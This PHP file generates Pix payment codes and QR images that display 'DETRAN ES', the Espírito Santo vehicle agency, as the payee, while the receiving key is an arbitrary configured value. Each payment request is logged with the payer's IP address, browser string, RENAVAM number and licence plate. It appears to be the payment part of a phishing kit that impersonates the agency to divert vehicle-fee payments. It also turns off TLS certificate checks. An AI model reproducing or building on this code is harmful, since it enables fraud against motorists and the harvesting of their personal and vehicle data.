<?php

require_once __DIR__ . '/storage.php';

function pix_parse_amount($valorRaw): float
{
    if (is_numeric($valorRaw)) {
        return (float) $valorRaw;
    }

    $normalized = preg_replace('/[^\d\.,-]/', '', (string) $valorRaw);
    $normalized = str_replace(',', '.', (string) $normalized);

    return (float) $normalized;
}

function pix_clean_description(string $descricao): string
{
    $descClean = $descricao;

    if (function_exists('transliterator_transliterate')) {
        $descClean = transliterator_transliterate('Any-Latin; Latin-ASCII', $descClean);
    } else {
        $descClean = @iconv('UTF-8', 'ASCII//TRANSLIT//IGNORE', $descClean);
    }

    $descClean = preg_replace('/\s+/u', '', (string) $descClean);

    return preg_replace('/[^A-Za-z0-9\-]/', '', (string) $descClean);
}

function pix_selected_key(string $preferredField = 'pixKey'): string
{
    $config = app_load_config();
    $selectedKey = trim((string) ($config[$preferredField] ?? ''));

    if ($selectedKey === '') {
        $selectedKey = trim((string) ($config['pixKey'] ?? ''));
    }

    if ($selectedKey === '') {
        $defaults = app_default_config();
        $selectedKey = (string) $defaults['pixKey'];
    }

    return $selectedKey;
}

function pix_build_response(string $key, $valorRaw, string $descricao, string $renavam = '', string $placa = ''): array
{
    $valor = pix_parse_amount($valorRaw);

    if ($valor <= 0) {
        throw new RuntimeException('Valor inválido');
    }

    $amountNumber = number_format($valor, 2, '.', '');
    $reference = 'REF' . time();
    $descClean = pix_clean_description($descricao);

    $code = build_pix_emv($key, 'DETRAN ES', 'ESPIRITO SANTO', $amountNumber, $descClean, $reference);
    $qrBase64 = qr_base64($code);

    log_pix($descricao, $valor, $key, $renavam, $placa);

    return [
        'code' => $code,
        'qrcode_base64' => $qrBase64,
        'reference' => $reference,
    ];
}

function emv_len($v)
{
    $length = strlen($v);

    return sprintf('%02d', $length);
}

function emv_kv($id, $value)
{
    return $id . emv_len($value) . $value;
}

function build_pix_emv($key, $name, $city, $amount, $desc, $ref)
{
    $name = mb_strtoupper((string) preg_replace('/[^A-Za-z0-9 \-]/', '', $name));
    $city = mb_strtoupper((string) preg_replace('/[^A-Za-z0-9 \-]/', '', $city));

    if ($name === '') {
        $name = 'COMERCIO';
    }

    if ($city === '') {
        $city = 'CIDADE';
    }

    $gui = emv_kv('00', 'BR.GOV.BCB.PIX');
    $infos = emv_kv('01', $key);
    if ($desc !== '') {
        $infos .= emv_kv('02', $desc);
    }

    $mai = emv_kv('26', $gui . $infos);
    $pfi = emv_kv('00', '01');
    $mcc = emv_kv('52', '0000');
    $cur = emv_kv('53', '986');
    $amt = emv_kv('54', $amount);
    $cty = emv_kv('58', 'BR');
    $mna = emv_kv('59', substr($name, 0, 25));
    $mci = emv_kv('60', substr($city, 0, 15));
    $add = emv_kv('05', $ref);
    $addt = emv_kv('62', $add);
    $base = $pfi . $mai . $mcc . $cur . $amt . $cty . $mna . $mci . $addt . '63' . '04';

    return $base . crc16($base);
}

function crc16($data)
{
    $poly = 0x1021;
    $crc = 0xFFFF;
    $len = strlen($data);

    for ($i = 0; $i < $len; $i++) {
        $crc ^= (ord($data[$i]) << 8);
        for ($b = 0; $b < 8; $b++) {
            if ($crc & 0x8000) {
                $crc = ($crc << 1) ^ $poly;
            } else {
                $crc = ($crc << 1);
            }
            $crc &= 0xFFFF;
        }
    }

    return strtoupper(str_pad(dechex($crc), 4, '0', STR_PAD_LEFT));
}

function qr_base64($payload)
{
    $url = 'https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=' . urlencode($payload);
    $ch = curl_init();

    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);

    $png = curl_exec($ch);
    curl_close($ch);

    return $png ? 'data:image/png;base64,' . base64_encode($png) : '';
}

function log_pix($descricao, $valor, $key, $renavam = '', $placa = '')
{
    try {
        $entries = app_read_json('pix_log.json', []);

        if (count($entries) > 1000) {
            array_shift($entries);
        }

        $entries[] = [
            'ts' => date('c'),
            'ip' => app_client_ip(),
            'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'descricao' => (string) $descricao,
            'valor' => (float) $valor,
            'valor_brl' => 'R$ ' . number_format((float) $valor, 2, ',', '.'),
            'key' => (string) $key,
            'renavam' => (string) $renavam,
            'placa' => (string) $placa,
        ];

        app_write_json('pix_log.json', $entries);
    } catch (Throwable $e) {
    }
}
